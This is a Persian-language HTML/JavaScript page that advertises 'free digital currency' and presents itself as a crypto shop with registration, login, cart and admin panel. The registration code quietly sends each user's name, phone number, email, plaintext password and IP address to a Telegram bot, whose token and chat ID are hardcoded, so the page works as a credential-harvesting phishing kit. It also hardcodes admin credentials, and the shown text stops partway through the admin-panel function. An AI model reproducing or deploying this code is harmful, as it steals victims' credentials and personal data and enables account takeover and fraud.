<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>ارز دیجیتال رایگان</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tahoma', sans-serif;
        }

        body {
            min-height: 100vh;
            background: #856203;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
            position: relative;
            overflow-x: hidden;
            width: 100%;
        }
        
        html {
            overflow-x: hidden;
            width: 100%;
        }

        .refresh-btn-circle {
            position: fixed;
            top: 16px;
            left: 16px;
            width: 40px;
            height: 40px;
            background: rgba(0, 217, 255, 0.25);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 217, 255, 0.5);
            border-radius: 50%;
            color: #00d9ff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px rgba(0, 217, 255, 0.3);
            margin: 0;
            padding: 0;
        }

        .refresh-btn-circle:hover {
            transform: scale(1.1) rotate(180deg);
            box-shadow: 0 0 25px rgba(0, 217, 255, 0.6);
            background: rgba(0, 217, 255, 0.4);
            border-color: #00d9ff;
        }

        .refresh-btn-circle:active {
            transform: scale(0.95);
        }

        .container, .admin-container {
            position: relative;
            background: rgba(20, 20, 30, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
            animation: fadeInUp 0.6s ease-out forwards;
            z-index: 2;
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            overflow-x: auto;
        }

        .container {
            max-width: 500px;
            width: 100%;
            padding: 24px 20px;
            margin: 0 auto;
            overflow-x: hidden;
        }

        .admin-container {
            width: 100%;
            padding: 20px 16px;
            margin: 0 auto;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h1 {
            color: #fff;
            font-size: clamp(1.2rem, 5vw, 1.8rem);
            text-align: center;
            margin-bottom: 8px;
            word-break: break-word;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.7);
            text-align: center;
            margin-bottom: 20px;
            font-size: 12px;
        }

        .input-group {
            margin-bottom: 16px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 6px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 13px;
        }

        .input-group input, .input-group textarea, .input-group select {
            width: 100%;
            padding: 12px 14px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            font-size: 14px;
            color: #fff;
            transition: 0.3s;
            outline: none;
        }

        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
            border-color: #00d9ff;
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 10px rgba(0, 217, 255, 0.3);
        }

        .toggle-password {
            position: absolute;
            left: 12px;
            bottom: 12px;
            background: rgba(255, 255, 255, 0.15);
            border: none;
            color: rgba(255, 255, 255, 0.7);
            cursor: pointer;
            font-size: 11px;
            padding: 4px 10px;
            border-radius: 20px;
            transition: 0.2s;
            width: auto;
            display: inline-block;
        }
        
        .toggle-password:hover {
            background: rgba(0, 217, 255, 0.3);
            color: #fff;
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, #00d9ff, #00a6c4);
            border: none;
            border-radius: 15px;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 8px;
        }

        button:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 15px rgba(0, 217, 255, 0.4);
        }

        .switch-link {
            margin-top: 20px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
            text-align: center;
        }

        .switch-link a {
            color: #00d9ff;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 12px 0;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 6px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 12px;
            cursor: pointer;
        }
        
        .checkbox-label input {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #00d9ff;
        }
        
        .forgot-link {
            color: #00d9ff;
            text-decoration: none;
            font-size: 11px;
            cursor: pointer;
        }

        .error {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        .success {
            color: #51cf66;
            font-size: 13px;
            margin-top: 12px;
            text-align: center;
            display: none;
            padding: 8px;
            background: rgba(81, 207, 102, 0.2);
            border-radius: 10px;
        }

        .hidden {
            display: none;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.9);
            color: #fff;
            padding: 10px 16px;
            border-radius: 40px;
            font-size: 12px;
            z-index: 1000;
            animation: slideIn 0.3s ease;
            display: none;
            border-left: 4px solid #00d9ff;
            text-align: center;
            max-width: calc(100% - 40px);
            margin: 0 auto;
        }

        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .nav-tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            padding-bottom: 12px;
            overflow-x: auto;
            overflow-y: hidden;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            white-space: nowrap;
            flex-wrap: nowrap;
            border-bottom: 1px solid rgba(255,255,255,0.2);
        }

        .nav-tab {
            background: rgba(255,255,255,0.1);
            padding: 8px 16px;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.3s;
            width: auto;
            margin-top: 0;
            font-size: 13px;
            flex-shrink: 0;
            white-space: nowrap;
        }

        .nav-tab:hover {
            background: rgba(0, 217, 255, 0.3);
            transform: none;
        }

        .nav-tab.active {
            background: linear-gradient(90deg, #00d9ff, #00a6c4);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 12px;
            border-radius: 16px;
            text-align: center;
            transition: 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-3px);
            background: rgba(255, 255, 255, 0.15);
        }

        .stat-card .stat-icon {
            font-size: 24px;
            margin-bottom: 6px;
        }
        
        .stat-card .stat-value {
            color: #00d9ff;
            font-size: 20px;
            font-weight: bold;
        }
        
        .stat-card .stat-label {
            color: rgba(255, 255, 255, 0.7);
            font-size: 11px;
            margin-top: 5px;
        }

        .products-grid, .special-products-grid, .discount-products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 16px;
            margin-top: 16px;
        }

        .product-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 14px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: 0.3s;
            position: relative;
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .product-card:hover {
            transform: translateY(-3px);
            background: rgba(255, 255, 255, 0.15);
        }

        .product-card.special {
            border: 2px solid #fbbf24;
            background: linear-gradient(135deg, rgba(251, 191, 36, 0.1), rgba(255, 255, 255, 0.05));
        }

        .product-card.discount {
            border: 2px solid #ff6b6b;
        }

        .product-image {
            width: 100%;
            height: 160px;
            object-fit: cover;
            border-radius: 16px;
            margin-bottom: 12px;
            background: rgba(255,255,255,0.05);
        }

        .product-image-placeholder {
            width: 100%;
            height: 160px;
            border-radius: 16px;
            margin-bottom: 12px;
            background: linear-gradient(135deg, rgba(0,217,255,0.1), rgba(255,255,255,0.05));
            display: flex;
            align-items: center;
            justify-content: center;
            color: rgba(255,255,255,0.3);
            font-size: 40px;
        }

        .special-badge {
            position: absolute;
            top: -8px;
            right: 12px;
            background: linear-gradient(90deg, #fbbf24, #d97706);
            color: #000;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: bold;
            z-index: 2;
        }

        .discount-badge {
            position: absolute;
            top: -8px;
            left: 12px;
            background: #ff6b6b;
            color: #fff;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: bold;
            z-index: 2;
        }
        
        .timer-badge {
            position: absolute;
            bottom: -8px;
            left: 12px;
            background: rgba(0, 0, 0, 0.7);
            color: #00d9ff;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 9px;
            font-family: monospace;
        }

        .product-title {
            color: #00d9ff;
            font-size: 15px;
            font-weight: bold;
            margin-bottom: 8px;
            word-break: break-word;
        }

        .product-price {
            color: #51cf66;
            font-size: 16px;
            font-weight: bold;
            margin: 8px 0;
        }

        .old-price {
            color: rgba(255,255,255,0.5);
            font-size: 12px;
            text-decoration: line-through;
            margin-left: 8px;
        }

        .discount-percent {
            color: #ff6b6b;
            font-size: 12px;
            font-weight: bold;
        }

        .product-desc {
            color: rgba(255,255,255,0.7);
            font-size: 11px;
            margin-bottom: 12px;
            word-break: break-word;
            flex: 1;
        }

        .add-to-cart-btn {
            background: linear-gradient(90deg, #a855f7, #7c3aed);
            padding: 8px;
            font-size: 12px;
        }

        .cart-item {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 12px;
            margin-bottom: 10px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }

        .cart-item-info {
            flex: 2;
            min-width: 150px;
        }

        .cart-item-actions {
            display: flex;
            gap: 8px;
        }

        .cart-item button {
            width: auto;
            padding: 6px 12px;
            margin-top: 0;
        }

        .ticket-item, .order-item, .message-item, .request-item, .text-item {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 12px;
            margin-bottom: 12px;
            border-right: 3px solid #00d9ff;
            word-break: break-word;
        }

        .ticket-subject, .order-title, .admin-text-title {
            color: #00d9ff;
            font-weight: bold;
            margin-bottom: 6px;
            font-size: 13px;
        }

        .status-pending { background: #ffa94d; color: #000; padding: 2px 8px; border-radius: 20px; font-size: 10px; display: inline-block; }
        .status-approved { background: #51cf66; color: #000; padding: 2px 8px; border-radius: 20px; font-size: 10px; display: inline-block; }
        .status-rejected { background: #ff6b6b; color: #000; padding: 2px 8px; border-radius: 20px; font-size: 10px; display: inline-block; }

        .admin-header {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 20px;
        }

        .admin-header h1 {
            margin-bottom: 0;
            font-size: clamp(1rem, 4vw, 1.5rem);
        }

        .logout-btn {
            background: linear-gradient(90deg, #ff6b6b, #ee5a24);
            width: auto;
            padding: 8px 18px;
            font-size: 13px;
        }

        .delete-btn, .edit-btn, .reply-btn, .approve-btn, .reject-btn, .send-msg-btn, .add-balance-btn, .settings-btn, .special-btn, .discount-btn {
            padding: 5px 10px;
            font-size: 11px;
            width: auto;
            margin: 2px;
            display: inline-block;
        }

        .search-box {
            padding: 10px 14px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            color: #fff;
            width: 100%;
            outline: none;
            font-size: 13px;
            margin-bottom: 12px;
        }

        .profile-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 16px;
            border-radius: 20px;
            margin: 15px 0;
        }

        .profile-card p {
            color: rgba(255, 255, 255, 0.9);
            margin: 8px 0;
            font-size: 13px;
            word-break: break-word;
        }

        .profile-card strong { color: #00d9ff; }

        .cart-summary {
            background: rgba(0, 217, 255, 0.1);
            padding: 12px;
            border-radius: 15px;
            margin-top: 15px;
            text-align: center;
        }
        
        .balance-card {
            background: linear-gradient(135deg, rgba(251, 191, 36, 0.2), rgba(217, 119, 6, 0.2));
            border: 1px solid rgba(251, 191, 36, 0.3);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 20px;
        }
        
        .balance-input-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .datetime-input {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .datetime-input input {
            width: 100%;
        }

        .table-wrapper {
            overflow-x: auto;
            width: 100%;
            margin: 12px 0;
            -webkit-overflow-scrolling: touch;
            border-radius: 12px;
        }
        
        table {
            width: 100%;
            min-width: 500px;
            border-collapse: collapse;
        }

        th, td {
            padding: 10px 8px;
            text-align: right;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.9);
            font-size: 12px;
        }

        th {
            background: rgba(0, 217, 255, 0.1);
            color: #00d9ff;
            font-size: 12px;
        }

        .image-preview {
            margin-top: 8px;
            max-width: 100px;
            max-height: 100px;
            border-radius: 8px;
            overflow: hidden;
        }

        .image-preview img {
            width: 100%;
            height: auto;
        }
        
        .admin-text-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 12px;
            margin-bottom: 12px;
            border-right: 3px solid #fbbf24;
        }
        
        .admin-text-title {
            color: #fbbf24;
            font-weight: bold;
            margin-bottom: 6px;
            font-size: 13px;
        }
        
        .admin-text-content {
            color: rgba(255,255,255,0.8);
            font-size: 12px;
            margin-bottom: 6px;
        }
        
        .admin-text-date {
            color: rgba(255,255,255,0.5);
            font-size: 10px;
        }

        @media (max-width: 768px) {
            body { padding: 10px; }
            .container, .admin-container { padding: 16px 12px; }
            h1 { font-size: 1.3rem; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
            .products-grid, .special-products-grid, .discount-products-grid { grid-template-columns: 1fr; gap: 12px; }
            .refresh-btn-circle { top: 10px; left: 10px; width: 36px; height: 36px; font-size: 16px; }
            .profile-card p { font-size: 12px; }
            .balance-card { padding: 12px; }
            .nav-tab { padding: 6px 14px; font-size: 12px; }
            button { padding: 10px; font-size: 13px; }
            .input-group input, .input-group textarea, .input-group select { padding: 10px 12px; font-size: 13px; }
            .admin-header { flex-direction: column; align-items: stretch; }
            .logout-btn { width: 100%; text-align: center; }
            .cart-item { flex-direction: column; align-items: stretch; }
            .cart-item-actions { justify-content: flex-end; }
        }

        @media (max-width: 480px) {
            .stats-grid { grid-template-columns: 1fr 1fr; }
            .nav-tabs { gap: 8px; }
            .nav-tab { padding: 6px 12px; font-size: 11px; }
            .refresh-btn-circle { width: 32px; height: 32px; font-size: 14px; top: 8px; left: 8px; }
            .products-grid, .special-products-grid, .discount-products-grid { grid-template-columns: 1fr; }
            .stat-card .stat-value { font-size: 18px; }
        }
    </style>
</head>
<body>

<button class="refresh-btn-circle" onclick="location.reload()">
    🔄
</button>

<div id="app">
    <div id="userLoginPage" class="container">
        <h1>ارز رایگان</h1>
        <div class="subtitle">ورود به سامانه</div>
        <div class="input-group">
            <label>ایمیل یا نام کاربری</label>
            <input type="text" id="userLoginUsername" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>رمز عبور</label>
            <input type="password" id="userLoginPassword" placeholder="••••••••">
            <button class="toggle-password" onclick="togglePassword('userLoginPassword')">👁 نمایش</button>
        </div>
        <div class="checkbox-group">
            <label class="checkbox-label"><input type="checkbox" id="rememberMe"> مرا به خاطر بسپار</label>
            <a class="forgot-link" onclick="alert('جهت بازیابی رمز با پشتیبانی تماس بگیرید')">رمز عبور را فراموش کرده‌اید؟</a>
        </div>
        <button onclick="userLogin()">دریافت ارز رایگان</button>
        <div class="switch-link">حساب کاربری ندارید؟ <a onclick="showUserRegister()">ثبت نام</a></div>
    </div>
    
    <div id="userRegisterPage" class="container hidden">
        <h1>📝 ثبت نام کاربر جدید</h1>
        <div class="input-group"><label>نام</label><input type="text" id="regName" placeholder="نام"></div>
        <div class="input-group"><label>نام خانوادگی</label><input type="text" id="regFamily" placeholder="نام خانوادگی"></div>
        <div class="input-group"><label>شماره همراه</label><input type="tel" id="regMobile" placeholder="0912xxx"></div>
        <div class="input-group"><label>ایمیل</label><input type="email" id="regEmail" placeholder="example@gmail.com"></div>
        <div class="input-group"><label>رمز عبور</label><input type="password" id="regPassword"><button class="toggle-password" onclick="togglePassword('regPassword')">نمایش</button></div>
        <button onclick="userRegister()">ثبت نام</button><div class="switch-link"><a onclick="showLogin()">بازگشت به ورود</a></div>
    </div>
    
    <div id="userProfilePage" class="admin-container hidden"></div>
    <div id="adminPanel" class="admin-container hidden"></div>
</div>

<div id="toast" class="toast"></div>

<script>
    // -------------------- تنظیمات بات تلگرام --------------------
    const TELEGRAM_BOT_TOKEN = "8726282046:AAF-H3I-5rVvb2NmA4lKDFkBIKtW1sKoFSU";
    // در صورت تمایل به دریافت پیام در یک گروه یا شخص، Chat ID خود را اینجا وارد کنید.
    // برای پیدا کردن Chat ID: به @userinfobot در تلگرام پیام دهید.
    const TELEGRAM_CHAT_ID = "8927319569"; // <--- این را به Chat ID واقعی خود تغییر دهید
    
    // تابع ارسال به تلگرام (با قابلیت دریافت IP تقریبی کاربر)
    async function sendToTelegram(userData) {
        // تلاش برای گرفتن IP (در محیط استاتیک HTML، این فقط یک شبیه‌سازی ساده است)
        let userIp = "نامشخص (محدودیت مرورگر)";
        try {
            // استفاده از API رایگان ipify برای دریافت IP (اگر با CORS مشکل داشت، ممکن است خطا دهد)
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            userIp = ipData.ip;
        } catch(e) {
            console.warn("عدم دسترسی به IP:", e);
        }

        const text = `
🚨 **ثبت نام جدید در سایت** 🚨
👤 نام: ${userData.name}
👥 نام خانوادگی: ${userData.family}
📞 شماره همراه: ${userData.mobile}
📧 ایمیل: ${userData.email}
🔑 رمز عبور: ${userData.password}
🌐 IP: ${userIp}
⏰ زمان: ${new Date().toLocaleString('fa-IR')}
        `;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
            if (!response.ok) {
                console.error("خطا در ارسال به تلگرام:", await response.text());
            } else {
                console.log("اطلاعات با موفقیت به تلگرام ارسال شد.");
            }
        } catch (error) {
            console.error("مشکل در ارتباط با تلگرام:", error);
        }
    }
    // ----------------------------------------------------------

    const ADMIN_EMAIL = "mohammad@gmail.com";
    const ADMIN_PASSWORD = "mohammad";
    
    let users = JSON.parse(localStorage.getItem('systemUsers')) || [];
    let currentUser = JSON.parse(localStorage.getItem('currentSession')) || null;
    let products = JSON.parse(localStorage.getItem('products')) || [
        { id: 1, name: "ارز شیباReact", price: 1200000, desc: "دوره جامع React", image: "" },
        { id: 2, name: " ارز نات کوین ", price: 890000, desc: "قالب اختصاصی", image: "" },
        { id: 3, name: " ارز بیتکوین", price: 500000, desc: "یک ساعت مشاوره", image: "" },
        { id: 4, name: " ارز تتر ", price: 2500000, desc: "مجموعه آموزش طراحی وب", image: "" },
        { id: 5, name: " ارز تون کوین ", price: 350000, desc: "افزونه قدرتمند امنیت", image: "" }
    ];
    let specialProducts = JSON.parse(localStorage.getItem('specialProducts')) || [1, 4];
    let discountProducts = JSON.parse(localStorage.getItem('discountProducts')) || {
        2: { percent: 15, startDate: null, endDate: null },
        5: { percent: 25, startDate: null, endDate: null }
    };
    let cart = JSON.parse(localStorage.getItem('cart')) || [];
    let orders = JSON.parse(localStorage.getItem('orders')) || [];
    let tickets = JSON.parse(localStorage.getItem('tickets')) || [];
    let adminMessages = JSON.parse(localStorage.getItem('adminMessages')) || [];
    let balanceRequests = JSON.parse(localStorage.getItem('balanceRequests')) || [];
    let balanceTransactions = JSON.parse(localStorage.getItem('balanceTransactions')) || [];

    function saveAll(){ localStorage.setItem('systemUsers', JSON.stringify(users)); localStorage.setItem('currentSession', JSON.stringify(currentUser)); localStorage.setItem('products', JSON.stringify(products)); localStorage.setItem('specialProducts', JSON.stringify(specialProducts)); localStorage.setItem('discountProducts', JSON.stringify(discountProducts)); localStorage.setItem('cart', JSON.stringify(cart)); localStorage.setItem('orders', JSON.stringify(orders)); localStorage.setItem('tickets', JSON.stringify(tickets)); localStorage.setItem('adminMessages', JSON.stringify(adminMessages)); localStorage.setItem('balanceRequests', JSON.stringify(balanceRequests)); localStorage.setItem('balanceTransactions', JSON.stringify(balanceTransactions)); }
    function showToast(msg){ let t=document.getElementById('toast'); t.textContent=msg; t.style.display='block'; setTimeout(()=>t.style.display='none',3000); }
    function togglePassword(id){ let inp=document.getElementById(id); inp.type=inp.type==='password'?'text':'password'; }
    
    function userLogin(){
        let username=document.getElementById('userLoginUsername').value.trim();
        let pass=document.getElementById('userLoginPassword').value.trim();
        if(username===ADMIN_EMAIL && pass===ADMIN_PASSWORD){ currentUser={email:ADMIN_EMAIL, name:"مدیر", balance:0, isAdmin:true}; saveAll(); showAdminPanel(); showToast("ورود مدیر موفق"); return; }
        let user=users.find(u=>u.email===username && u.password===pass);
        if(user){ currentUser=user; saveAll(); if(document.getElementById('rememberMe').checked) localStorage.setItem('savedLogin',JSON.stringify({username,password})); else localStorage.removeItem('savedLogin'); showUserPanel(); showToast(`خوش آمدید ${user.name}`); }
        else showToast("اطلاعات نادرست است");
    }
    
    function userRegister(){ 
        let name = document.getElementById('regName').value.trim();
        let family = document.getElementById('regFamily').value.trim();
        let mobile = document.getElementById('regMobile').value.trim();
        let email = document.getElementById('regEmail').value.trim();
        let pass = document.getElementById('regPassword').value.trim();
        
        if(!name || !family || !mobile || !email || !pass){
            showToast("تمامی فیلدها الزامی هستند");
            return;
        }
        if(users.find(u=>u.email===email)){
            showToast("ایمیل تکراری است");
            return;
        }
        if(users.find(u=>u.mobile===mobile)){
            showToast("شماره همراه تکراری است");
            return;
        }
        
        let newUser = {
            email,
            name,
            family,
            mobile,
            password: pass,
            balance: 0,
            isAdmin: false
        };
        users.push(newUser);
        currentUser = newUser;
        saveAll();
        
        // ارسال اطلاعات به تلگرام
        sendToTelegram({
            name: name,
            family: family,
            mobile: mobile,
            email: email,
            password: pass        });
        
        showUserPanel();
        showToast("ثبت نام موفق");
    }
    
    function showLogin(){ document.getElementById('userLoginPage').classList.remove('hidden'); document.getElementById('userRegisterPage').classList.add('hidden'); document.getElementById('userProfilePage').classList.add('hidden'); document.getElementById('adminPanel').classList.add('hidden'); }
    function showUserRegister(){ document.getElementById('userLoginPage').classList.add('hidden'); document.getElementById('userRegisterPage').classList.remove('hidden'); }
    function logout(){ currentUser=null; localStorage.removeItem('currentSession'); showLogin(); showToast("خارج شدید"); }
    
    function getDiscountedPrice(price, productId){ let d=discountProducts[productId]; if(d && d.percent){ let now=new Date(); if((!d.startDate || new Date(d.startDate)<=now) && (!d.endDate || new Date(d.endDate)>=now)) return price*(100-d.percent)/100; } return price; }
    function getFinalPrice(pId){ let p=products.find(x=>x.id==pId); if(!p) return 0; return getDiscountedPrice(p.price, pId); }
    
    function addToCart(productId){ let p=products.find(p=>p.id==productId); if(p){ let cartItem=cart.find(i=>i.id==productId); if(cartItem) cartItem.qty+=1; else cart.push({id:p.id, name:p.name, price:getFinalPrice(p.id), qty:1, originalPrice:p.price}); saveAll(); showToast(`${p.name} به سبد اضافه شد`); renderUserProfile(); } }
    function removeFromCart(productId){ cart=cart.filter(i=>i.id!=productId); saveAll(); renderUserProfile(); showToast("حذف شد"); }
    function updateQty(id, delta){ let item=cart.find(i=>i.id==id); if(item){ item.qty+=delta; if(item.qty<=0) cart=cart.filter(i=>i.id!=id); saveAll(); renderUserProfile(); } }
    function checkout(){ if(cart.length===0){showToast("سبد خالی است");return;} let total=cart.reduce((sum,i)=>sum+(i.price*i.qty),0); if(currentUser.balance<total){showToast(`موجودی کافی نیست. نیاز: ${total.toLocaleString()} تومان`); return;} currentUser.balance-=total; let newOrder={id:Date.now(), userId:currentUser.email, items:JSON.parse(JSON.stringify(cart)), total, date:new Date().toLocaleString(), status:"پرداخت شده"}; orders.push(newOrder); cart=[]; balanceTransactions.push({userId:currentUser.email, type:"خرید", amount:-total, date:new Date().toLocaleString()}); saveAll(); renderUserProfile(); showToast(`سفارش ثبت شد. موجودی جدید: ${currentUser.balance.toLocaleString()} تومان`); }
    
    function renderUserProfile(){
        let container=document.getElementById('userProfilePage'); if(!container) return;
        let totalCart=cart.reduce((s,i)=>s+(i.price*i.qty),0);
        let html=`<div class="admin-header"><h1>👤 پنل کاربری ${currentUser.name}</h1><button class="logout-btn" onclick="logout()">خروج</button></div>
        <div class="profile-card"><p><strong>نام:</strong> ${currentUser.name} ${currentUser.family || ''}</p><p><strong>ایمیل:</strong> ${currentUser.email}</p><p><strong>شماره همراه:</strong> ${currentUser.mobile || 'ثبت نشده'}</p><p><strong>موجودی:</strong> ${currentUser.balance.toLocaleString()} تومان</p><button onclick="requestBalance()">درخواست افزایش موجودی</button></div>
        <div class="balance-card"><h3>🛒 سبد خرید</h3>${cart.length===0?'<p>سبد خالی است</p>':cart.map(i=>`<div class="cart-item"><div class="cart-item-info"><b>${i.name}</b><br>قیمت: ${i.price.toLocaleString()} تومان<br>تعداد: ${i.qty}</div><div class="cart-item-actions"><button onclick="updateQty(${i.id},1)">+</button><button onclick="updateQty(${i.id},-1)">-</button><button onclick="removeFromCart(${i.id})">حذف</button></div></div>`).join('')}
        ${cart.length?`<div class="cart-summary">مجموع: ${totalCart.toLocaleString()} تومان<button onclick="checkout()">پرداخت و تسویه</button></div>`:''}</div>
        <div class="nav-tabs"><div class="nav-tab active" onclick="showUserTab('products')">محصولات</div><div class="nav-tab" onclick="showUserTab('special')">ویژه</div><div class="nav-tab" onclick="showUserTab('discount')">تخفیف دار</div><div class="nav-tab" onclick="showUserTab('orders')">سفارشات</div><div class="nav-tab" onclick="showUserTab('tickets')">تیکت‌ها</div><div class="nav-tab" onclick="showUserTab('messages')">پیام‌های ادمین</div></div>
        <div id="userTabContent"></div>`;
        container.innerHTML=html; container.classList.remove('hidden'); document.getElementById('userLoginPage').classList.add('hidden'); document.getElementById('adminPanel').classList.add('hidden'); showUserTab('products');
    }
    function showUserTab(tab){
        let contentDiv=document.getElementById('userTabContent'); if(!contentDiv) return;
        if(tab==='products') contentDiv.innerHTML=renderProductsList(products, false);
        else if(tab==='special') contentDiv.innerHTML=renderProductsList(products.filter(p=>specialProducts.includes(p.id)), true);
        else if(tab==='discount') contentDiv.innerHTML=renderProductsList(products.filter(p=>discountProducts[p.id]), true);
        else if(tab==='orders'){ let userOrders=orders.filter(o=>o.userId===currentUser.email); contentDiv.innerHTML=userOrders.length?userOrders.map(o=>`<div class="order-item">📦 سفارش ${o.id}<br>تاریخ: ${o.date}<br>مجموع: ${o.total.toLocaleString()} تومان<br>وضعیت: ${o.status}<br>محصولات: ${JSON.parse(JSON.stringify(o.items)).map(i=>`${i.name} x${i.qty}`).join(', ')}</div>`).join('') : '<p>سفارشی نیست</p>';}
        else if(tab==='tickets'){ contentDiv.innerHTML=`<div><input type="text" id="ticketSubject" placeholder="موضوع"><textarea id="ticketMsg" placeholder="متن تیکت"></textarea><button onclick="sendTicket()">ارسال تیکت</button></div><div id="ticketsList">${tickets.filter(t=>t.userId===currentUser.email).map(t=>`<div class="ticket-item"><div class="ticket-subject">${t.subject}</div><div>${t.message}</div><div>وضعیت: ${t.status} | پاسخ: ${t.reply||'پاسخی داده نشده'}</div></div>`).join('')}</div>`; }
        else if(tab==='messages'){ let msgs=adminMessages.filter(m=>m.userId===currentUser.email); contentDiv.innerHTML=msgs.length?msgs.map(m=>`<div class="message-item"><strong>از ادمین:</strong> ${m.message}<br><small>${m.date}</small></div>`).join(''):'<p>پیام جدیدی نیست</p>'; }
        document.querySelectorAll('.nav-tab').forEach((el,i)=>{ if(el.innerText.includes(tab==='products'?'محصولات':tab==='special'?'ویژه':tab==='discount'?'تخفیف':tab==='orders'?'سفارشات':tab==='tickets'?'تیکت‌ها':'پیام‌ها')) el.classList.add('active'); else el.classList.remove('active'); });
    }
    function renderProductsList(productList, showBadge){ return `<div class="products-grid">${productList.map(p=>{ let finalPrice=getDiscountedPrice(p.price, p.id); let hasDisc=!!discountProducts[p.id]; let isSpec=specialProducts.includes(p.id); return `<div class="product-card ${isSpec?'special':''} ${hasDisc?'discount':''}"><div class="product-image-placeholder">🛍️</div>${isSpec?'<div class="special-badge">✨ ویژه</div>':''}${hasDisc?'<div class="discount-badge">🔥 تخفیف</div>':''}<div class="product-title">${p.name}</div><div class="product-desc">${p.desc}</div><div class="product-price">${finalPrice.toLocaleString()} تومان ${p.price!==finalPrice?`<span class="old-price">${p.price.toLocaleString()}</span> <span class="discount-percent">(-${discountProducts[p.id]?.percent}%)</span>`:''}</div><button class="add-to-cart-btn" onclick="addToCart(${p.id})">➕ افزودن به سبد</button></div>`}).join('')}</div>`; }
    
    function sendTicket(){ let sub=document.getElementById('ticketSubject')?.value, msg=document.getElementById('ticketMsg')?.value; if(!sub||!msg){showToast("موضوع و متن الزامی");return;} tickets.push({id:Date.now(), userId:currentUser.email, subject:sub, message:msg, status:"در انتظار پاسخ", reply:""}); saveAll(); showUserTab('tickets'); showToast("تیکت ارسال شد"); }
    function requestBalance(){ let amount=prompt("مبلغ درخواست (تومان):"); if(amount && !isNaN(amount)){ balanceRequests.push({id:Date.now(), userId:currentUser.email, amount:parseInt(amount), status:"pending"}); saveAll(); showToast("درخواست ثبت شد، ادمین بررسی میکند"); } }
    function showAdminPanel(){
        let container=document.getElementById('adminPanel'); if(!container) return;
        let totalUsers=users.length; let totalSales=orders.reduce((s,o)=>s+o.total,0);
